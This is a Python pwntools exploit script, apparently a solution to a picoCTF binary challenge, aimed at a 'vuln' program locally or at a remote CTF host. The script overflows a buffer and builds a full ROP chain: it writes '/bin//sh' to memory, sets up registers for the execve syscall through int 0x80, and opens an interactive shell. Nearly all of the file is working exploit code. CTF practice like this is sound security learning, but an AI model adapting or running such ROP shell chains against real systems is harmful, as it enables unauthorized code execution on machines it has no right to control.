from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("saturn.picoctf.net", 64182)

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x08049db4
    #     break *0x08049dc0
    #     continue
    #     ''')

    print(r.recvuntil(b'grasshopper!'))

    payload = b"B" * 28
    #payload += p32(0x909090)

    # goal
    ## int 0x80
    ## eax = 11
    ## args: ebx, ecx, edx, esi, edi, ebp
    ### ebx = (address) -> /bin/sh
    ### ecx = 0
    ### edx = 0

    # overview
    #
    # (set /bin/sh on an arbitrary address)
    #
    # 0x080583b9 : pop edx ; pop ebx ; ret
    # 0
    # (arbitrary address)
    # 0x08049e29 : pop ecx ; ret
    # 0
    # 0x080b073a : pop eax ; ret
    # 11
    # 0x0804a3c2 : int 0x80

    # set /bin/sh on an arbitrary address for ebx
    ## bin
    ### set eax
    payload += p32(0x080b073a) # pop eax ; ret
    arbitrary_address = 0x080e5060 # data_start
    payload += p32(arbitrary_address)
    ### set edx, no meaning ebx for now
    payload += p32(0x080583b9) # pop edx ; pop ebx ; ret
    payload += b"/bin"
    payload += b"\x90\x90\x90\x90"
    ### set "bin" to an arbitray address
    payload += p32(0x0809e5c8) # mov dword ptr [eax], edx ; ret
    ## sh
    payload += p32(0x080b073a) # pop eax ; ret
    payload += p32(arbitrary_address + 0x4) # data_start + 0x4
    ### set edx, no meaning ebx for now
    payload += p32(0x080583b9) # pop edx ; pop ebx ; ret
    payload += b"//sh"
    payload += b"\x90\x90\x90\x90"
    ### set "bin" to an arbitray address
    payload += p32(0x0809e5c8) # mov dword ptr [eax], edx ; ret

    # edx, ebx setting
    payload += p32(0x080583b9) # pop edx ; pop ebx ; ret
    payload += p32(0)
    payload += p32(0x080e5060) # data_start

    # ecx setting
    payload += p32(0x08049e29) # pop ecx ; ret
    payload += p32(0)

    # eax setting
    payload += p32(0x080b073a) # pop eax ; ret
    payload += p32(11)

    # system call
    payload += p32(0x0804a3c2) # int 0x80

    print(payload.hex())
    print(payload)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
